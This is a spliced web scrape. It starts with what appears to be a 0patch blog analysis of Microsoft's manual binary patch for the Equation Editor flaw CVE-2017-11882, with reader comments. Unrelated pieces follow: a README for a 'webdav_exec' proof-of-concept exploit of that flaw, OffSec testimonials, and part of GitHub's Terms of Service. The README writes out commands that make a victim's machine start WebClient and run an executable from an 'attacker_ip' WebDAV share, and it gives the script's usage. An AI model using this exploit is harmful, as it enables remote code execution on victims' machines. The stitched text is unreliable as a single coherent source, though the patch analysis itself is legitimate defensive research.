[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0DFJCW0nBXQQbl5RVesEv8yM5C4y6vqJLDXboQr7_SinByDrH8i7A0dq-uhsrjEHUxmnaRgD7ar1gqcUZskbpbnkOHLADbvUWK6fiHtQ4Z3b3Y9_AFWejkevLIK1_ShFFk4Xru5BHv4rb/s640/Equation_Editor_diff_patched_function.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0DFJCW0nBXQQbl5RVesEv8yM5C4y6vqJLDXboQr7_SinByDrH8i7A0dq-uhsrjEHUxmnaRgD7ar1gqcUZskbpbnkOHLADbvUWK6fiHtQ4Z3b3Y9_AFWejkevLIK1_ShFFk4Xru5BHv4rb/s1600/Equation_Editor_diff_patched_function.PNG)

This function takes a pointer to the destination buffer and copies characters, one by one in a loop, from user-supplied string to this buffer. It is also the very function that Embedi found to be vulnerable in their research; namely, there was no check whether the destination buffer was large enough for the user-supplied string, and a too-long font name provided through the Equation object could cause a buffer overflow.

Microsoft's fix introduced an additional parameter to this function, specifying the destination buffer length. The original logic of the character-copying loop was then modified so that the loop ends not only when the source string end is reached, but also when the destination buffer length is reached - preventing buffer overflow. In addition, the copied string in the destination buffer is zero-terminated after copying, in case the destination buffer length was reached (which would leave the string unterminated).

Let's look at the code in its text form (again, patched function on left, vulnerable on right):

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbwrISsFajRN3RaxX4Ifogd77w010gSKkHjcEc3aVQio1cmoo1FaZk-17WBJ1tlj3CfuKnGcRhLRfA9XnWdrCXq9Rc0sHrMZp5BFIdWaKZvDHyyuMEeEgMClLRS7R67_SK6J2Z32q9bp7C/s640/Patched_function_code_diff.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbwrISsFajRN3RaxX4Ifogd77w010gSKkHjcEc3aVQio1cmoo1FaZk-17WBJ1tlj3CfuKnGcRhLRfA9XnWdrCXq9Rc0sHrMZp5BFIdWaKZvDHyyuMEeEgMClLRS7R67_SK6J2Z32q9bp7C/s1600/Patched_function_code_diff.png)
As you can see, whoever patched this function not only added a check for buffer length in it, but also managed to make the function 14 bytes shorter (and padded the resulting gap before the adjacent function with 0xCC bytes for style points :). Impressive.

**Patching The Callers**

Moving on. If the patched function got an additional parameter, all those calling it would have to change as well, right? There are exactly two callers of this function, at addresses 43B418 and 4181FA, and in the patched version they both have a push instruction added before the call to specify the length of their buffers, 0x100 and 0x1F4 respectively.

Now, a push instruction with a 32-bit literal operand takes 5 bytes. In order to add this instruction to these two functions while staying within the tight space of the original code (whose logic must also remain intact), thepatcher did the following:

For function at address 43B418, the patched function temporarily stores some value - which it will need later on - in ebx instead of a local stack-based variable, which releases enough bytes for injecting the push call. (By the way, additional evidence of manual patching is that while the local variable is no longer used, space for it is still made on the stack; otherwise sub esp, 0x10C would turn into sub esp, 0x108.)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEio38llUlygTJ_NsRRaHIHkYqhPZXmmCF3sec3kgiPqTRSqZc21cIHCTf7_o8bkaiSSnrO8AFfjB0e1TbNZSK3PpkGazDI_JmSCZROrAr1IEnr82JMAkUMze8W3luLRzlmCtio_UGx79KMm/s640/Equation_Editor_diff_43B418.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEio38llUlygTJ_NsRRaHIHkYqhPZXmmCF3sec3kgiPqTRSqZc21cIHCTf7_o8bkaiSSnrO8AFfjB0e1TbNZSK3PpkGazDI_JmSCZROrAr1IEnr82JMAkUMze8W3luLRzlmCtio_UGx79KMm/s1600/Equation_Editor_diff_43B418.PNG)

For the other caller, function at address 4181FA, the patched function mysteriously has the push instruction injected without any other modifications to the code that would introduce the needed extra space.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixj_rLisDsJMndmTGOXDoSi4ncN01cOenpN6wYH67Qx3dR5_-PZjDwb6QSNOXRIGQjPyrY_aGnOs8RiGHkzuYEM_Nx4rc8UphiGCN8kq6k8yGB_Aex6JfpCpVjXKueKWC9kWqgKrwLL_Q-/s640/Equation_Editor_diff_4181FA.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixj_rLisDsJMndmTGOXDoSi4ncN01cOenpN6wYH67Qx3dR5_-PZjDwb6QSNOXRIGQjPyrY_aGnOs8RiGHkzuYEM_Nx4rc8UphiGCN8kq6k8yGB_Aex6JfpCpVjXKueKWC9kWqgKrwLL_Q-/s1600/Equation_Editor_diff_4181FA.PNG)

As you can see on the above image, the push instruction is injected at the beginning of the yellow block, and all original instructions in that block are pushed down 5 bytes. But why does this not overwrite 5 bytes of the original code somewhere else? It's as if there were 5 or more unused bytes already in existence just after this block of code that the patcher could safely overwrite.

To solve this mystery, let's look at the code in its text form.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEfprSByDLlfoqDcG4K_JeQ7pEcclD2HwPzP60YC-GuNmOG7g7rGZiw6cm4BqCoeBye_z04njU2LmXb9P7AfOSYEKLnXFMC8L3w-Co3W-Pf-c76Q7RaX7B4G0wNsYhbD1A9tiQKbrnc9kz/s640/4181FA_code_diff.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEfprSByDLlfoqDcG4K_JeQ7pEcclD2HwPzP60YC-GuNmOG7g7rGZiw6cm4BqCoeBye_z04njU2LmXb9P7AfOSYEKLnXFMC8L3w-Co3W-Pf-c76Q7RaX7B4G0wNsYhbD1A9tiQKbrnc9kz/s1600/4181FA_code_diff.PNG)

Surprise, the vulnerable version actually had an extra jmp loc\_418318 instruction at the end of the modified code block. How convenient! This allows the code in this block to be moved down 5 bytes, making space for the push instruction at the top.

Coincidence? Perhaps, but it looks an awful lot like this code block got manually modified before in the past, whereby it got shortened for 5 bytes and its last instruction (jmp loc\_418318) was left there.

**Additional Security Checks**

What we've covered so far was related to Embedi's published research and CVE-2017-11882, but is *not* what blocks Embedi's exploit. The new version of EQNEDT32.EXE has two additional modified functions at addresses 41160F and 4219F0. Let's have a look at them.

In the patched executable, these two functions got a bunch of injected boundary checks for copying to what appear to be 0x20-byte buffers. These checks all look the same: ecx (which is the counter for copying) is compared to 0x21; if it's greater than or equal to that, ecx gets set to 0x20. All these checks are injected right before inlined memcpy operations. Let's look at one of them to see how the patcher made room for the additional instructions.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe0z6vud-e8X-qN8MdsAuXQ3tdKEVU6NbGAw-0DjAtqoprFTNriJYQEO1CPN3Wpd7RilpN9K_Oq8K_kIB19Nn4YjD6tcAV9DN4sIn4WpU0nizx4DkVVgHmqZWjqTKI5Z9CtlF4t2lm2ijK/s640/Equation_Editor_diff_41160F.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe0z6vud-e8X-qN8MdsAuXQ3tdKEVU6NbGAw-0DjAtqoprFTNriJYQEO1CPN3Wpd7RilpN9K_Oq8K_kIB19Nn4YjD6tcAV9DN4sIn4WpU0nizx4DkVVgHmqZWjqTKI5Z9CtlF4t2lm2ijK/s1600/Equation_Editor_diff_41160F.PNG)

As shown on the above image, a check is injected before the inlined memcpy code. Note that in 32-bit code, memcpy is typically implemented by first copying blocks of 4 bytes using the movsd (move double word) instruction, while any remaining bytes are then copied using movsb (move byte). This is efficient in terms of performance, but whoever was patching this noticed that some space can be freed by only using movsb, and perhaps sacrificing a nanosecond or two. After doing so, the code remained logically identical but now there was space for injecting the check before it, as well as for zero-terminating the copied string. Again, an impressive and clever hack (and there was still an extra byte to spare - notice the nop?)

There are six such length checks in two modified functions, and just one of them is directly responsible for blocking Embedi's exploit. We believe that Microsoft noticed some additional attack vectors that could also cause a buffer overflow and decided to proactively patch the other five memcpys and the patched function we covered earlier.

**Final Touches**

After patching the vulnerable code and effectively manually building a new version of Equation Editor, the patcher also corrected the version number of EQNEDT32.EXE to 2017.8.14.0, and the *TimeDateStamp* in the PE header to August 14, 2017 (hex value 5991FA38) - which is just 10 days after Microsoft acknowledged receipt of Embedi's report. (Note however that due to the manual nature of setting these values it's possible that code has been modified after that date.)

[Update 11/20/2017] Another thing Microsoft also patched in EQNEDT32.EXE was the "ASLR bit", i.e., they set the IMAGE\_DLLCHARACTERISTICS\_DYNAMIC\_BASE flag in the [PE optional header structure](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339%28v%3Dvs.85%29.aspx):

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPg_J8QSSkyHHtChYKp7iqQurszpBIyb-BoKW6_XGIaYw6144v2mT6BSJUvgEWsM3ZhBSIDeZVvsAhSSPLOhXU686BgxoMdx8dhCnTs0VDJhGjwqxHb1jG9zjg_kEdqWqtHjYMHiqYW6DE/s640/ASLR.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPg_J8QSSkyHHtChYKp7iqQurszpBIyb-BoKW6_XGIaYw6144v2mT6BSJUvgEWsM3ZhBSIDeZVvsAhSSPLOhXU686BgxoMdx8dhCnTs0VDJhGjwqxHb1jG9zjg_kEdqWqtHjYMHiqYW6DE/s1600/ASLR.png)

This is good. Enabling ASLR on EQNEDT32.EXE will make it harder to exploit any remaining memory corruption vulnerabilities. For instance, Embedi's exploit would not work with ASLR because it relied on the fact that the call to WinExec would always be present at the same memory address; this allowed them to simply put that address on stack and wait for the ret to do all the work.

Interestingly, Microsoft decided not to also set the IMAGE\_DLLCHARACTERISTICS\_NX\_COMPAT ("DEP") flag, which would prevent code execution from data pages (e.g., from stack). They surely had good reasons, but should any additional vulnerabilities be found and exploited in EQNEDT32.EXE, the exploit will likely include execution of data on stack or heap. [End update 11/20/2017]

**Conclusion**

Maintaining a software product in its binary form instead of rebuilding it from modified source code is hard. We can only speculate as to why Microsoft used the binary patching approach, but being binary patchers ourselves we think they did a stellar job.

This old Equation Editor is now under the spotlight, and many researchers are likely to start fuzzing it for additional vulnerabilities. If any are found, we'll probably see additional rounds of manual binary patches in EQNEDT32.EXE. While Office has had a new Equation Editor integrated since at least version 2007, Microsoft can't simply remove EQNEDT32.EXE (the old Equation Editor) from Office as there are probably tons of old documents out there containing equations in this old format, which would then become un-editable.

Now how would we micropatch CVE-2017-11882 with 0patch? It would actually be much easier: we wouldn't have to shrink existing code to make room for the injected one, because 0patch makes sure that we get all the space we need. So we wouldn't have to come up with clever hacks like de-optimizing memcpy or finding an alternative place to temporarily store a value for later use. This freedom and flexibility makes developing an in-memory micropatch much easier and quicker than in-file patching, and we believe software vendors like Microsoft could benefit greatly from using in-memory micropatching for fixing critical vulnerabilities.

Oh by the way, Microsoft also updated Office's wwlib.dll this Patch Tuesday, prompting us to port our [DDE / DDEAUTO patches](https://blog.0patch.com/2017/10/0patching-office-dde-ddeauto.html) to these new versions. 0patch Agent running on your computer will automatically download and apply these new patches without interrupting you. If you don't have 0patch Agent installed yet, we have good news for you: IT'S FREE! Just [download](http://0patch.com/download.htm), install and register, and you're all set.

Cheers!

     This is the most obvious and probably the real reason. 17 year old source code got lost... God knows, maybe they were not even using a source code version control system back then.

     Either this or they know how long their builds take. Maybe a very long time. I think also other files would be touched with a re-compile from source. Throw OEM and alternate language versions in. If more than 100 versions then it's clear why. If it's just 5 or 6 versions maybe different. Surely this saves a recompile on somewhere between 24 and 75 builds of the same software. Saves on bandwidth too, maybe they want to get this out quick and deep = small file gets in quicker.

   Having the patched version on the left has lately become a habit to us (often diffing the latest version with multiple older versions so primary stays open). But wondering, is there some consensus on this in the community?

     I haven't heard of any consensus (or seen the question asked before). I typically do Old Left - New Right so i can see what was present when I started and what changes I've made.
     When doing a merge I'll put my changes on the left with the new file on the right when comparing so the destination is on the right.

     That said: without looking it up I don't know how I diff current vs past revisions. (Verifying it I do have past on left with current would be on right)

     Although it sounds logical to have the newer versions to the right like in a timeline, it's more "natural?" to have the newer on the left and the older on the right :D Dunno, I got a strange feeling about that :D

     ditto the above, it's like reading left to right, like an x-axis timeline increasing from left to right. Seems a reasonable request.

   The copyright tag in the first screenshot is interesting. Who are "Design Science, Inc."? Perhaps that's why Microsoft doesn't have the source?

   Equation Editor was written bu a third party vendor (Design Science). Most probably MS did not have the source code.

     That's not correct: MathType has been around for a long time: first on the Mac, and then on Windows 2. Microsoft licensed a scaled-down version of MathType, called Equation Editor, for inclusion with some of its products on both Windows and Macintosh.

    Reported a bug to MS in GDI+ Image.Save() about 2 years ago, which is present from XP to Win10. Some encoders do not report an error if write operations fail (e.g. out of disk space) and generate invalid files. MS offered 3 different approaches, how to work around this problem, but refused to accept this being a bug. I got the impression, that they don't want to touch old code. After a lot of arguing (maybe 10 emails) they finally accepted it being a bug. Maybe they are scared that a rebuild with a current tool chain may cause strange side effects. Maybe the old code base contains "dirty tricks", that would cause issues with current tools.

      I'm pretty sure that a company like Microsoft, does not only keep old sources, but also the relevant tool chains, target OSes (to build and test upon). Otherwise things would be pretty futile and indeed dangerous.

      That doesn't mean, of course, that they are reluctant to change old software - every little change could introduce a compatibility issue on the other end.

    Technically, Microsoft could just have a replicable build toolchain. This is a thing in safety critical computing, where you should be able to recreate binaries bit-for-bit; usually this means version controlling the source code together with the entire toolchain.

    MS had source code (or Design Science compiled it for them) at least as far as around 2005, since different build comes with Office 2007 and file is dated 10/04/2005 (also TimeDateStamp in both builds correspond to file modification date). For whatever reason they reverted to older builds since Office 2010 I think.

    Besides recompilation I see no other differences, version numbers are the same, copyright date is the same etc.

    Discovered that while updating manually Equation Editor on various PCs with different Office versions.

    TL&DR; Office 2007 had different version of Equation Editor built in 2005.

    I was an engineer at Microsoft working on compatibility fixes and did a lot of these patches. You are very often better off making a very specific tweak to older codebases rather than doing a full build. Minor changes to compilers, other tools, etc are an issue, but the big one is recreating the full test suite for older apps. Doing a professional job releasing software that could be in use by millions of people is a HUGE endeavor to do properly.

# webdav\_exec CVE-2017-11882

A simple PoC for CVE-2017-11882.
This exploit triggers WebClient service to start and execute remote file from attacker-controlled WebDav server.
The reason why this approach might be handy is a limitation of executed command length.
However with help of WebDav it is possible to launch arbitrary attacker-controlled executable on vulnerable machine.
This script creates simple document with several OLE objects.
These objects exploits CVE-2017-11882, which results in sequential command execution.

The first command which triggers WebClient service start may look like this:

```
cmd.exe /c start \\attacker_ip\ff

```

Attacker controlled binary path should be a UNC network path:

```
\\attacker_ip\ff\1.exe

```

## Usage

```
webdav_exec_CVE-2017-11882.py -u trigger_unc_path -e executable_unc_path -o output_file_name
```

# Sample exploit for CVE-2017-11882 (starting calc.exe as payload)

     ![Duane LaFlotte](/_astro/duane.CAyBZp_-.png)
### Duane LaFlotte

CTO, Pulsar Security

  I feel like every person's first experience in cybersecurity should be OffSec. Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)
### Emile Kok

Founder and Managing Director, TSTC Institute

  When going to the real world, you have to know what you're doing and understand what is expected from you on the job. For us, OffSec is the champion in this league in educating and preparing learners.      ![Douglas Costa](/_astro/douglas.BdxOPM2d.png)

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright © GitHub, Inc. All rights reserved. You may not duplicate, copy, or reuse any portion of the HTML/CSS, JavaScript, or visual design elements or concepts without express written permission from GitHub.

### [2. GitHub Trademarks and Logos](#2-github-trademarks-and-logos)

### [3. License to GitHub Policies](#3-license-to-github-policies)

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

